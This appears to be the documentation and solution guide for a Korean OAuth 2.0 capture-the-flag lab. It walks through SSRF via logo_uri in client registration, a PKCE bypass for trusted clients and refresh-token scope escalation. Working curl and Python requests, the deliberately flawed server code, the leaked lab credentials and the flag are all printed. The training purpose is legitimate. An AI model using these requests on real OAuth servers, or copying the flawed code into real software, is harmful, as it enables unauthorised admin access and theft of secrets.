# 🔐 OAuth CTF Advanced - Documentation

## 📋 목차
1. [CTF 개요](#ctf-개요)
2. [공격 체인 (Attack Chain)](#공격-체인)
3. [아키텍처](#아키텍처)
4. [단계별 상세 가이드](#단계별-상세-가이드)
5. [실행 방법](#실행-방법)

---

## CTF 개요

### 🎯 목표
OAuth 2.0 구현의 실제 취약점을 연계한 **4단계 공격 체인**을 통해 최종 FLAG를 획득합니다.

### 📊 정보
- **난이도**: ⭐⭐⭐⭐⭐⭐ (고난이도)
- **예상 소요 시간**: 2-4시간
- **CTF 타입**: Blackbox
- **FLAG**: `MSG{0auth_pp_f0nt_ch41n_m4st3r}`

### 🔗 공격 체인 요약
```
Stage 1: SSRF via Client Registration
    ↓ (admin credentials + trusted client 획득)
Stage 2: Admin OAuth Login
    ↓ (authorization code 획득)
Stage 3: PKCE Bypass
    ↓ (access token + refresh token 획득)
Stage 4: Scope Escalation
    ↓ (ADMIN_SECRETS scope 획득)
Stage 5: FLAG Capture
    ↓ (FLAG 획득!)
```

---

## 공격 체인

### 🎯 Stage 1: SSRF via Client Registration

**목표**: Admin credentials 및 trusted client 정보 획득

**취약점**: Server-Side Request Forgery in OAuth Dynamic Client Registration (RFC 7591)

**공격 방법**:
1. OAuth Client Registration 엔드포인트 발견
   - `/oauth/register` (POST)
   - Discovery: `/.well-known/oauth-authorization-server`

2. `logo_uri` 파라미터에 내부 URL 주입
```json
{
  "client_name": "SSRF Attack",
  "redirect_uris": ["http://localhost:8080/auth/callback"],
  "logo_uri": "http://auth-server:8000/internal/admin/hint"
}
```

3. 서버가 내부 서비스에 HTTP 요청 → 응답 반환

**획득 정보**:
```json
{
  "status": "success",
  "message": "Development environment configuration retrieved",
  "admin_credentials": {
    "username": "MSG_CTF_HACKER",
    "password": "Wh3r3_is_SSRF?!",
    "role": "administrator",
    "user_id": "user_admin_001"
  },
  "trusted_client": {
    "client_id": "msg_developer_portal",
    "client_secret": "dev_portal_secret_2024",
    "privileges": "elevated"
  }
}
```

**핵심 포인트**:
- OAuth 스펙은 `logo_uri`를 이미지 URL로 정의
- 서버가 URL 유효성 검증 없이 `requests.get(logo_uri)` 호출
- 내부 네트워크의 보호된 엔드포인트에 접근 가능
- Docker 내부 네트워크에서 `auth-server:8000` 호스트로 접근
- **개발 환경에서 내부 엔드포인트에 credentials 노출**은 현실적인 시나리오

---

### 🔐 Stage 2: Admin OAuth Login

**목표**: Authorization Code 획득

**공격 방법**:
1. Stage 1에서 획득한 admin credentials 사용
2. Stage 1에서 획득한 trusted client 사용
3. OAuth Authorization Endpoint 접속
```
GET /oauth/authorize?
  client_id=msg_developer_portal&
  redirect_uri=http://localhost:8080/auth/callback&
  response_type=code&
  scope=read&
  state=random_state
```

4. Admin 계정으로 로그인
   - Username: `MSG_CTF_HACKER`
   - Password: `Wh3r3_is_SSRF?!`

5. Authorization Code 획득

**획득 정보**:
- Authorization Code: `code_xxxxxxxxxxxx`

**핵심 포인트**:
- 정상적인 OAuth 2.0 Authorization Code Flow
- Admin 권한이 있어야 ADMIN_SECRETS scope에 접근 가능
- PKCE를 사용하지만 trusted client는 예외 (다음 단계)

---

### 🔓 Stage 3: PKCE Bypass

**목표**: Access Token 및 Refresh Token 획득

**취약점**: PKCE Bypass for Trusted Clients

**정상적인 PKCE 플로우**:
```
1. Client: code_verifier 생성 (43-128자의 랜덤 문자열)
2. Client: code_challenge = BASE64URL(SHA256(code_verifier))
3. Client: Authorization 요청 시 code_challenge 전송
4. Server: code_challenge 저장
5. Client: Token 요청 시 code_verifier 전송
6. Server: SHA256(code_verifier)가 저장된 code_challenge와 일치하는지 검증
```

**취약점 분석**:
```python
# Trusted clients are exempt from PKCE validation
PREREGISTERED_CLIENTS = {
    "msg_developer_portal": {
        "client_name": "MSG.COM Developer Portal",
        "client_secret": "dev_portal_secret_2024",
        "privileges": "elevated"  # ← PKCE bypass allowed
    }
}
```

**공격 방법**:
```bash
curl -X POST http://localhost:8080/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=$AUTH_CODE" \
  -d "client_id=msg_developer_portal" \
  -d "client_secret=dev_portal_secret_2024" \
  -d "redirect_uri=http://localhost:8080/auth/callback"
  # NO code_verifier needed for trusted clients!
```

**획득 정보**:
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "refresh_xxxxxxxxxxxx",
  "scope": "read"
}
```

**핵심 포인트**:
- PKCE는 Authorization Code Interception 공격을 방지하기 위한 메커니즘
- Trusted clients (first-party apps)는 종종 PKCE 검증에서 예외 처리됨
- 실제 구현에서도 발견되는 configuration 취약점

---

### 📈 Stage 4: Scope Escalation via Refresh Token

**목표**: ADMIN_SECRETS scope 획득

**취약점**: Refresh Token Grant에서 임의의 scope 허용

**정상적인 동작**:
```
RFC 6749: Refresh token으로 새 access token 발급 시,
요청된 scope는 원래 부여된 scope의 부분집합이어야 함
```

**취약점 분석**:
```python
# auth-server/app_sqlite.py
original_scope = refresh_data['scope']  # "read"

if requested_scope:
    # ⚠️ VULNERABILITY: 원래 scope 검증 없음!
    final_scope = requested_scope  # "ADMIN_SECRETS" 허용
else:
    final_scope = original_scope

# Scope escalation 성공!
```

**공격 방법**:
```bash
curl -X POST http://localhost:8080/oauth/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH_TOKEN" \
  -d "client_id=msg_developer_portal" \
  -d "client_secret=dev_portal_secret_2024" \
  -d "scope=ADMIN_SECRETS"
```

**획득 정보**:
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "ADMIN_SECRETS",
  "admin_access": true
}
```

**JWT Payload**:
```json
{
  "iss": "https://auth.oauth-ctf.local",
  "sub": "user_admin_001",
  "aud": "oauth-resource-server",
  "exp": 1234567890,
  "iat": 1234567890,
  "scope": "ADMIN_SECRETS",
  "token_type": "access"
}
```

**핵심 포인트**:
- Refresh token grant는 사용자 인증 없이 새 access token 발급
- OAuth 스펙에서는 scope가 확대되지 않아야 함
- Admin 계정만 ADMIN_SECRETS scope를 얻을 수 있도록 제한됨
- 전체 공격 체인 완료해야만 FLAG 획득 가능

---

### 🏁 Stage 5: FLAG Capture

**목표**: 최종 FLAG 획득

**공격 방법**:
```bash
curl http://localhost:8080/api/admin/flag \
  -H "Authorization: Bearer $ADMIN_ACCESS_TOKEN"
```

**응답**:
```json
{
  "success": true,
  "message": "Administrative access granted",
  "flag": "MSG{0auth_pp_f0nt_ch41n_m4st3r}",
  "user_id": "user_admin_001",
  "admin_data": {
    "database_key": "database_master_key_2024",
    "api_token": "admin_api_override_token"
  },
  "access_level": "ADMIN_SECRETS"
}
```

**검증 로직**:
```python
# resource-server/app.py
@app.route('/api/admin/flag')
def get_flag():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    # JWT 검증
    payload = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])

    # Scope 검증
    if 'ADMIN_SECRETS' not in payload.get('scope', ''):
        return jsonify({'error': 'Insufficient scope'}), 403

    return jsonify({
        'flag': 'MSG{0auth_pp_f0nt_ch41n_m4st3r}',
        'message': 'Congratulations!'
    })
```

---

## 아키텍처

### 🏗️ 시스템 구조

```
External Access (Port 8080 Only)
┌─────────────────────────────────────────────────────────┐
│                    Nginx (Port 8080)                    │
│                   Reverse Proxy Layer                   │
│                                                         │
│  Routes:                                                │
│    /          → fresh-client                            │
│    /oauth/*   → auth-server                             │
│    /api/*     → resource-server                         │
└────────────┬────────────┬───────────────┬───────────────┘
             │            │               │
      ┌──────▼──────┐ ┌──▼──────────┐ ┌──▼──────────────┐
      │   Fresh     │ │    Auth     │ │    Resource     │
      │   Client    │ │   Server    │ │     Server      │
      │  (Deno)     │ │  (Flask)    │ │    (Flask)      │
      │  :8001      │ │  :8000      │ │    :8002        │
      └─────────────┘ └──────┬──────┘ └─────────────────┘
                             │
                      ┌──────▼──────┐
                      │   SQLite    │
                      │  Database   │
                      │   (/data)   │
                      └─────────────┘

Internal Docker Network (oauth-ctf-network)
```

### 🔧 컴포넌트

#### 1. **Nginx** (Reverse Proxy)
- **역할**: 단일 진입점 (8080 포트)
- **라우팅**:
  - `/` → Fresh Client
  - `/oauth/*` → Auth Server
  - `/api/*` → Resource Server
- **보안**: 내부 서비스는 외부에 노출되지 않음

#### 2. **Fresh Client** (Deno)
- **역할**: OAuth 클라이언트 (프론트엔드)
- **기능**:
  - OAuth callback 처리 (`/auth/callback`)
  - API 문서 페이지
  - 클라이언트 데모
- **포트**: 8001 (내부 only)

#### 3. **Auth Server** (Flask + SQLite)
- **역할**: OAuth 2.0 Authorization Server
- **기능**:
  - Client Registration (RFC 7591) - **SSRF 취약점**
  - Authorization Endpoint
  - Token Endpoint - **Scope Escalation 취약점**
  - PKCE Bypass (trusted clients)
- **포트**: 8000 (내부 only)
- **데이터베이스**: SQLite (`/app/data/oauth_ctf.db`)

#### 4. **Resource Server** (Flask)
- **역할**: Protected API 제공
- **기능**:
  - `/api/admin/flag` (FLAG 엔드포인트)
  - JWT 검증
  - Scope 검증
- **포트**: 8002 (내부 only)

---

## 단계별 상세 가이드

### 🔍 Stage 1: SSRF (상세)

#### 1. 엔드포인트 발견
```bash
# OAuth discovery
curl http://localhost:8080/.well-known/oauth-authorization-server

# Response에서 registration_endpoint 확인
{
  "registration_endpoint": "http://localhost:8080/oauth/register"
}
```

#### 2. SSRF 테스트
```bash
# 내부 서비스 스캔
curl -X POST http://localhost:8080/oauth/register \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Test",
    "redirect_uris": ["http://localhost/callback"],
    "logo_uri": "http://auth-server:8000/"
  }'

# 응답에 logo_fetch_result 포함
```

#### 3. 경로 탐색
```bash
# robots.txt 힌트: /internal/admin/
curl http://localhost:8080/robots.txt

# Common paths
/internal/admin/config  → 404
/internal/admin/hint    → 200 ✓ (SUCCESS!)
/internal/admin/secret  → 404
```

#### 4. Credentials + Client 정보 획득
```bash
curl -X POST http://localhost:8080/oauth/register \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "SSRF",
    "redirect_uris": ["http://localhost:8080/auth/callback"],
    "logo_uri": "http://auth-server:8000/internal/admin/hint"
  }' | jq '.logo_fetch_result.content'
```

---

### 🔐 Stage 2: Admin Login (상세)

#### 1. OAuth Flow 시작
```bash
# Browser로 접속 또는 자동화 스크립트 사용
http://localhost:8080/oauth/authorize?
  client_id=msg_developer_portal&
  redirect_uri=http://localhost:8080/auth/callback&
  response_type=code&
  scope=read&
  state=ctf_attack
```

#### 2. Login Form
```
Username: MSG_CTF_HACKER
Password: Wh3r3_is_SSRF?!
```

#### 3. Authorization Code 획득
```
Redirect: http://localhost:8080/auth/callback?
  code=code_xxxxxxxxxxxxx&
  state=ctf_attack
```

---

### 🔓 Stage 3: PKCE Bypass (상세)

#### 1. Token Exchange
```python
import requests

data = {
    'grant_type': 'authorization_code',
    'code': auth_code,
    'client_id': 'msg_developer_portal',
    'client_secret': 'dev_portal_secret_2024',
    'redirect_uri': 'http://localhost:8080/auth/callback'
    # NO code_verifier! Trusted client bypass!
}

resp = requests.post('http://localhost:8080/oauth/token', data=data)
tokens = resp.json()

print(f"Access Token: {tokens['access_token']}")
print(f"Refresh Token: {tokens['refresh_token']}")
print(f"Scope: {tokens['scope']}")  # "read"
```

---

### 📈 Stage 4: Scope Escalation (상세)

#### 1. JWT 분석
```bash
# Access token 디코드 (jwt.io)
{
  "iss": "https://auth.oauth-ctf.local",
  "sub": "user_admin_001",
  "scope": "read",  # ← read scope만 있음
  "token_type": "access"
}
```

#### 2. Scope Escalation 시도
```bash
curl -X POST http://localhost:8080/oauth/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH_TOKEN" \
  -d "client_id=msg_developer_portal" \
  -d "client_secret=dev_portal_secret_2024" \
  -d "scope=ADMIN_SECRETS"  # ← Admin scope 요청
```

#### 3. 새 Token 획득
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "scope": "ADMIN_SECRETS",  # ✓ Escalated!
  "admin_access": true
}
```

---

### 🏁 Stage 5: FLAG Capture (상세)

#### 1. API 엔드포인트 발견
```bash
# API 문서 확인
curl http://localhost:8080/api/

# /api/admin/flag 발견
```

#### 2. 접근 시도
```bash
# Without token
curl http://localhost:8080/api/admin/flag
# → 401 Unauthorized

# With read scope
curl http://localhost:8080/api/admin/flag \
  -H "Authorization: Bearer $READ_TOKEN"
# → 403 Insufficient scope

# With ADMIN_SECRETS scope
curl http://localhost:8080/api/admin/flag \
  -H "Authorization: Bearer $ADMIN_TOKEN"
# → 200 OK
```

#### 3. FLAG 획득
```json
{
  "flag": "MSG{0auth_pp_f0nt_ch41n_m4st3r}",
  "message": "Congratulations! You've completed the OAuth attack chain!",
  "user_id": "user_admin_001",
  "scope": "ADMIN_SECRETS"
}
```

---

## 실행 방법

### 🚀 Quick Start

#### 1. 환경 설정
```bash
# 저장소 클론
git clone <repository-url>
cd oauth-ctf-advanced

# 환경 변수 설정
echo "JWT_SECRET=$(openssl rand -base64 64)" > .env
echo "BASE_URL=http://localhost:8080" >> .env
```

#### 2. 서비스 시작
```bash
# Docker Compose로 모든 서비스 시작
docker-compose up -d

# 로그 확인
docker-compose logs -f

# 서비스 상태 확인
docker-compose ps
```

#### 3. 접속 확인
```bash
# 메인 포털
curl http://localhost:8080

# OAuth Discovery
curl http://localhost:8080/.well-known/oauth-authorization-server

# Auth Server
curl http://localhost:8080/oauth/

# API Server
curl http://localhost:8080/api/
```

#### 4. CTF 시작
브라우저에서 `http://localhost:8080` 접속

---

### 📝 자동 풀이 스크립트

```bash
# Python 환경 설정
cd docs
pip install requests

# 전체 공격 체인 실행
python solve_real_final.py
```

---

## 🏆 CTF 성공 기준

### ✅ 완료 체크리스트
- [ ] Stage 1: SSRF로 admin credentials + trusted client 획득
- [ ] Stage 2: Authorization code 획득
- [ ] Stage 3: Access token 및 Refresh token 획득 (scope: read)
- [ ] Stage 4: Admin scope 획득 (ADMIN_SECRETS)
- [ ] Stage 5: FLAG 획득 (`MSG{0auth_pp_f0nt_ch41n_m4st3r}`)

---

## 📚 학습 리소스

### OAuth 2.0 스펙
- [RFC 6749 - OAuth 2.0 Framework](https://datatracker.ietf.org/doc/html/rfc6749)
- [RFC 7591 - Dynamic Client Registration](https://datatracker.ietf.org/doc/html/rfc7591)
- [RFC 7636 - PKCE](https://datatracker.ietf.org/doc/html/rfc7636)
- [RFC 6819 - OAuth 2.0 Threat Model](https://datatracker.ietf.org/doc/html/rfc6819)

### 보안 취약점
- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP Top 10 2021](https://owasp.org/Top10/)

---

## ⚠️ 주의사항

### 📜 의도된 취약점
- Server-Side Request Forgery (SSRF) in Client Registration
- PKCE Bypass for Trusted Clients
- OAuth Scope Escalation via Refresh Token

### ⚖️ 법적 고지
- 이 CTF는 교육 목적으로만 사용되어야 합니다
- 실제 시스템에 대한 무단 테스트는 불법입니다
- 학습한 기술은 윤리적이고 합법적인 방식으로만 사용하세요
